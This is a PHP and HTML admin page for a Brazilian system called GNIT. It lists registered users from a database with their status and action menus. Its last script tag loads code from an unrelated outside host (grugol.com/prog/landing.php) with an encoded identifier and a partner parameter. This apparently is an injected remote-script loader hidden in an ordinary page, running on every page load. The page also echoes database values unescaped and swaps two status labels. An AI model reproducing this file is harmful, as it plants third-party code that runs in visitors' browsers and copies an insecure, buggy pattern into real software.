<?php

include 'configs/conexao.php';

$buscar_cadastro = "SELECT * FROM usuário";
$query_cadastros = mysqli_query($conn, $buscar_cadastro);

?>

<html lang="pt-BR">

<head>

	<meta charset="UTF-8" />
	<title>GNIT - Notificações</title>
	<meta charset="UTF-8">


	<!--Os arquivos Meta-->
	<meta name="viewport" content="width=device-width,initial-scale=1.0">
	<meta name="description" content="GNIT">
	<meta name="author" content="">
	<!--Fim dos arquivos Meta-->

	<!--Os Arquivos CSS-->
	<link href="css/bootstrap.min.css" rel="stylesheet">
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet">
	<link href="css/template.css" rel="stylesheet">


	<!--HTML5 shim,for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

</head>

<body>
	<!-- Fixed navbar -->
	<nav class="navbar navbar-default navbar-fixed-top">
		<div class="container">
			<div class="navbar-header">
				<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
					<span class="sr-only">Toggle navigation</span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
				</button>
				<a class="navbar-brand" href="propriedades.php"><b>GNIT</b></a>
			</div>
			<div id="navbar" class="navbar-collapse collapse">
				<ul class="nav navbar-nav">
					<li><a href="quem.php">Quem Somos</a></li>
					<li><a href="contato.php">Contato</a></li>
				</ul>
				<ul class="nav navbar-nav navbar-right">


					<!--<li class="active"><a href="./">Fixed top <span class="sr-only">(current)</span></a></li>-->
					<div id="perfil">
						<span style="vertical-align:middle; padding-right:10px"> <i>Danillo Souza</i></span>
						<a href="minhaconta.php"><img src="https://via.placeholder.com/40" class="img-circle"></a>
					</div>
				</ul>
			</div>
			<!--/.nav-collapse -->
		</div>
	</nav>
	<!--Final da NavBar-->
	<div class="container-fluid" style="margin-top:80px;">
		<div class="row">
			<div class="col-md-2" id="menu-esquerdo">
				<p><img src="img/nit.jpg" style="margin-left:15px"></p>
				<ul class="nav nav-pills nav-stacked">
					<li role="presentation"><a href="propriedades.php" .php"><img src="img/dashboard.png"> DashBoard</a></li>
					<li role="presentation" class="active"><a href="minhastarefas.php"><img src="img/carrinho.png"> Minhas Notificações</a></li>
					<li role="presentation"><a href="minhaconta.php"><img src="img/ticket.png"> Minha Conta</a></li>
					<li role="presentation"><a href="faq.php"><img src="img/faq.png"> Sistema de FAQ</a></li>
					<li role="presentation"><a href="index.php"><img src="img/sair.png"> Sair</a></li>
				</ul>
			</div>
			<!--Final Menu Esquerdo-->
			<div class="col-md-10" id="conteudo">
				<div class="row">

					<h1>Minhas Tarefas </h1>
					<div id="icones">
						<div class="col-md-4">
							<div class="bloco-icone">
								<a href="minhastarefas.php">
									<h4>Notificações</h4>
								</a>
								<div>
									<img src="img/post.png" id="fotoconfig">
									<span class="texto-bloco">Revista INPI</span>
								</div>
							</div>
						</div>
						<!--<div class="col-md-4">
                <div class="bloco-icone">
                  <a><h4>Arquivos</h4></a>
                    <div>
                      <img src="img/carrinho.png">
                      <span class="texto-bloco">Arquivos do projeto</span>
                    </div>
                </div>
              
              </div>
              -->
						<div class="col-md-4">
							<div class="bloco-icone">
								<a href="#">
									<h4>Empenho</h4>
								</a>
								<div>
									<img src="img/entregar.png">
									<span class="texto-bloco">Emissão de GRU</span>
								</div>
							</div>
						</div>
						<div class="col-md-4">
							<div class="bloco-icone">
								<a href="usuarios.php">
									<h4>Meus Usuários</h4>
								</a>
								<div>
									<img src="img/ticket.png">
									<span class="texto-bloco">Cadastros Pendentes</span>
								</div>
							</div>
						</div>
					</div>
					<!--fim dos icones-->
				</div>
				<br />
				<h3 style='text-align:center'> Lista de Usuários</h3>
				<div class="table-responsive col-md-12">
					<table class="table table-striped" cellspacing="0" cellpadding="0">
						<thead>
							<th>USUÁRIO</th>
							<th>SITUAÇÃO</th>
							<th>DATA DE CADASTRO</th>
							<th>OPÇÕES</th>
						</thead>
						<tbody>
							<?php
							while ($receber_cadastros = mysqli_fetch_array($query_cadastros)) {
								$email = $receber_cadastros['eml_usu'];
								$situacao = $receber_cadastros['sit_usu'];
								$data_cad = $receber_cadastros['dt_cad'];
								// $data_format = date('d/m/Y', $data_cad);
								$permissao = '';
								if ($situacao == '1') {
									$permissao = " Acesso liberado";
								} else if ($situacao == '2') {
									$permissao = " Análise pendente";
								} else {
									$permissao = " Exclusão de conta";
								}

							?>

								<tr>
									<td><span class="glyphicon glyphicon-user" aria-hidden="true"></span><?php echo $email; ?></td>
									<?php
									if ($situacao == '1') {
										echo '<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> Análise pendente</td>';
									} else if ($situacao == '2') {
										echo '<td><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> Acesso liberado</td>';
									} else {
										echo '<td><span class="glyphicon glyphicon-remove" aria-hidden="true"></span> Exclusão de conta</td>';
									}
									?>

									<td><?php echo $data_cad; ?></td>
									<td class="actions">

										<!--dropdown-->
										<div class="btn-group">
											<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
												Opções <span class="caret"></span>
											</button>
											<ul class="dropdown-menu">
												<li><a class="btn btn-primary btn-xs" href="#" data-toggle="modal" data-target="#sucess-modal">Liberar</a></a></li>
												<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
												<li></li>
												<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
												<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
											</ul>
										</div>
									</td>
								</tr>
							<?php }; ?>
						</tbody>

					</table>
				</div>

			</div> <!-- /#list -->
		</div>

	</div>


	<!-- Modal -->
	<div class="modal fade" id="delete-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
		<div class="modal-dialog" role="document">
			<div class="modal-content">
				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
					<h4 class="modal-title" id="modalLabel">Excluir Item</h4>
				</div>
				<div class="modal-body">
					Deseja realmente excluir este item?
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-primary">Sim</button>
					<button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
				</div>
			</div>
		</div>
	</div>
	<hr>
	<div id="bottom" class="row rodape">
		<div class="col-md-12">
			<ul class="pagination">
				<li class="disabled"><a>&lt; Anterior</a></li>
				<li class="disabled"><a>1</a></li>
				<li><a href="#">2</a></li>
				<li><a href="#">3</a></li>
				<li class="next"><a href="#" rel="next">Pr&oacuteximo &gt;</a></li>
			</ul><!-- /.pagination -->
		</div>
	</div> <!-- /#bottom -->
	<div class="col-md-12">
		<hr>
		<footer>
			<h3>&copy GNIT - Todos os Direitos Reservados</h3>
		</footer>

	</div>


	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

	<!-- Latest compiled and minified JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
	<script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script>
</body>
</body>

</html>

</html>